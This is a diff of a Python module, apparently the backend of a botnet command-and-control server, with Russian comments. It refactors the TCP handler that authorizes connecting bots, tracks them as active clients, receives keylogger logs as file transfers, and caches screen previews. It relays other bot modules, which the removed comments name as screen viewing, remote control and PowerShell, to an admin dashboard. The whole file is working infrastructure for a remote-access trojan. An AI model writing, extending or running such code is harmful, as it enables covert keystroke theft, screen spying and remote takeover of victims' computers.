@@ -1,134 +1,121 @@
-# backend\Core\ClientConnection.py
+# backend/Core/ClientConnection.py
 
 import asyncio
 import socket
-import traceback
-from typing import Optional
+from typing import Optional, Dict, Any, Tuple
 
 import backend.LoggerWrapper as logger
-from backend.Services import read_packet, pack_packet, authorize_bot, sync_bot_data
-from backend.Services import active_clients, preview_cache
+from backend.Services.network import NetworkProtocol
+
+# ИСПРАВЛЕННЫЕ ИМПОРТЫ:
+# Авторизацию берем из Auth.py
+from backend.Services.Auth import authorize_bot, sync_bot_data
+# Хранилища берем из ClientManager.py
+from backend.Services.ClientManager import active_clients, preview_cache
+
 from backend.Services.SystemState import system_state
 from backend.Services.FileManager import file_service
-from backend.API import manager
+from backend.API.connection_manager import manager
 from backend import add_bytes
 
 class BotConnectionHandler:
     """
-    Обработчик входящих TCP-соединений от ботов.
-    Реализует логику протокола V7.2 FINAL.
+    Обработчик входящих TCP-соединений от ботов V8.0.
     """
 
     async def handle_new_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
-        bot_id: Optional[str] = None
-        peer_address = writer.get_extra_info("peername")[0]
+        bot_identifier: Optional[str] = None
+        peer_address_info: Tuple[str, int] = writer.get_extra_info("peername")
+        peer_host: str = peer_address_info[0]
 
-        # Оптимизация сокета для быстрой передачи
         if (client_socket := writer.get_extra_info("socket")):
             client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 
         try:
-            # 1. Авторизация (получение ID бота)
-            auth_res = await authorize_bot(reader, peer_address)
-            if not auth_res:
-                logger.Log.warning(f"[TCP] Auth failed for {peer_address}")
-                return await self._force_close(writer)
+            # 1. Авторизация (теперь импортируется из Auth.py)
+            auth_result = await authorize_bot(reader, peer_host)
+            if not auth_result:
+                return await self._force_close_stream(writer)
 
-            bot_id, _ = auth_res
-            active_clients[bot_id] = (reader, writer)
+            bot_identifier, _ = auth_result
+            active_clients[bot_identifier] = (reader, writer)
             
-            # 2. Обновление состояния в БД/Системе
-            sync_bot_data(bot_id, {"status": "online"})
-            system_state.broadcast_global_update()
+            sync_bot_data(bot_identifier, {"status": "online"})
             
-            # Если в кэше уже есть картинка от предыдущей сессии, отправим её админам
-            system_state.broadcast_preview(bot_id)
+            # Рассылка состояния админам
+            manager.broadcast_packet_sync(system_state.get_global_update_packet())
+            if (prev_packet := system_state.get_preview_packet(bot_identifier)):
+                manager.broadcast_packet_sync(prev_packet)
 
-            # 3. Основной цикл обработки пакетов
+            logger.Log.success(f"[Core] Bot connected: {bot_identifier}")
+
+            # 4. Основной цикл
             while True:
                 try:
-                    # Читаем пакет целиком согласно Header (6b)
-                    raw_data = await asyncio.wait_for(read_packet(reader), timeout=45.0)
+                    packet_data = await asyncio.wait_for(
+                        NetworkProtocol.read_packet(reader), 
+                        timeout=45.0
+                    )
                 except asyncio.TimeoutError: 
-                    logger.Log.debug(f"[TCP] Connection timeout for {bot_id}")
                     break
 
-                p_id, mod_body, payload = raw_data
-                if not p_id: 
-                    break # Соединение разорвано
+                current_id, metadata, payload = packet_data
+                if not current_id or metadata is None: break
 
-                # Сбор статистики трафика (Header 6b + ID + Mod + Payload)
-                p_len = 4 if isinstance(payload, int) else len(payload)
-                add_bytes(6 + len(p_id) + len(mod_body) + p_len)
+                # Трафик
+                p_size = 5 if metadata["type"] == "int" else len(payload)
+                m_str = f"{metadata['module']}:{metadata['type']}:{metadata['action']}:{metadata['extra']}"
+                add_bytes(8 + len(current_id) + len(m_str) + p_size)
 
-                # Парсинг Mod_Body по разделителю ":"
-                mod_parts = mod_body.split(":", 1)
-                mod_name = mod_parts[0]
-                mod_file = mod_parts[1] if len(mod_parts) > 1 else "None"
+                target_mod = metadata["module"]
 
-                # --- ЛОГИКА ОБРАБОТКИ МОДУЛЕЙ V7.2 ---
-                
-                # А. Статичные данные системы
-                if mod_name == "SystemInfoStream":
-                    sync_bot_data(p_id, payload)
-                    system_state.broadcast_global_update()
+                if target_mod == "SystemInfo":
+                    sync_bot_data(current_id, payload)
+                    manager.broadcast_packet_sync(system_state.get_global_update_packet())
 
-                # Б. Модуль PREVIEW (Атомарная передача байт в RAM)
-                elif mod_name == "Preview":
-                    if isinstance(payload, bytes) and len(payload) > 0:
-                        # Обновляем кэш в Services.ClientManager
-                        # Старое превью удаляется автоматически при присваивании нового
-                        preview_cache[p_id] = payload
-                        
-                        # Рассылка через WebSocket (фронтенд получит актуальный кадр)
-                        system_state.broadcast_preview(p_id, payload)
-                        logger.Log.info(f"[TCP] Preview updated for {p_id} ({len(payload)} bytes)")
+                elif target_mod == "Preview":
+                    if isinstance(payload, bytes) and payload:
+                        preview_cache[current_id] = payload
+                        if (p_pkt := system_state.get_preview_packet(current_id, payload)):
+                            manager.broadcast_packet_sync(p_pkt)
+
+                elif target_mod == "Keylogger":
+                    if metadata["action"] == "START":
+                        file_service.init_transfer(current_id, metadata["extra"], payload)
                     else:
-                        logger.Log.warning(f"[TCP] Preview from {p_id} has invalid payload type")
+                        await file_service.write_chunk(current_id, metadata["extra"], payload)
 
-                # В. Передача файлов (Keylogger, FileManager и т.д.)
-                elif mod_name in ["Keylogger", "FileTransfer"] and isinstance(payload, int):
-                    # Анонс: payload содержит общий размер файла
-                    file_service.init_transfer(p_id, mod_file, payload)
-                
-                elif mod_name in ["KeyloggerStream", "FileTransferStream"]:
-                    # Стрим: запись чанка данных
-                    await file_service.write_chunk(p_id, mod_file, payload)
+                elif target_mod == "Heartbeat":
+                    if metadata["action"] == "PING":
+                        res = NetworkProtocol.pack_packet(current_id, "Heartbeat", "str", "PONG", "none", "")
+                        writer.write(res)
+                        await writer.drain()
 
-                # Г. Сердцебиение (Heartbeat)
-                elif mod_name == "Heartbeat":
-                    # Отвечаем понгом по стандарту
-                    writer.write(pack_packet(p_id, "Heartbeat:None", "pong"))
-                    await writer.drain()
-
-                # Д. ТРАНЗИТ (ScreenView, RemoteControl, Powershell и т.д.)
                 else:
-                    # Все, что сервер не обрабатывает локально, летит админу на фронт
-                    manager.broadcast_packet_sync(pack_packet(p_id, mod_body, payload))
+                    # Транзит всех остальных команд на фронтенд
+                    transit = NetworkProtocol.pack_packet(
+                        current_id, target_mod, metadata["type"], 
+                        metadata["action"], metadata["extra"], payload
+                    )
+                    manager.broadcast_packet_sync(transit)
 
-        except (asyncio.IncompleteReadError, ConnectionResetError):
-            logger.Log.debug(f"[TCP] Client {bot_id} reset connection")
         except Exception as e:
-            logger.Log.error(f"[TCP] Runtime Error: {e}")
-            # traceback.print_exc() 
+            logger.Log.error(f"[Core] Handler error: {e}")
         finally:
-            await self._close_bot(bot_id, writer)
+            await self._terminate_bot_session(bot_identifier, writer)
 
-    async def _close_bot(self, bot_id: Optional[str], writer: asyncio.StreamWriter) -> None:
-        """Корректное удаление бота из списков и закрытие сокета."""
+    async def _terminate_bot_session(self, bot_id: Optional[str], writer: asyncio.StreamWriter) -> None:
         if bot_id and bot_id in active_clients:
             active_clients.pop(bot_id, None)
             sync_bot_data(bot_id, {"status": "offline"})
-            system_state.broadcast_global_update()
-            logger.Log.info(f"[TCP] Bot {bot_id} disconnected")
-        
-        await self._force_close(writer)
+            # Оповещаем фронтенд об отключении
+            manager.broadcast_packet_sync(system_state.get_global_update_packet())
+            logger.Log.info(f"[Core] Bot {bot_id} offline")
+        await self._force_close_stream(writer)
 
-    async def _force_close(self, writer: asyncio.StreamWriter) -> None:
-        """Принудительное закрытие потока."""
+    async def _force_close_stream(self, writer: asyncio.StreamWriter) -> None:
         try:
             if not writer.transport.is_closing():
                 writer.close()
                 await writer.wait_closed()
-        except: 
-            pass
+        except: pass
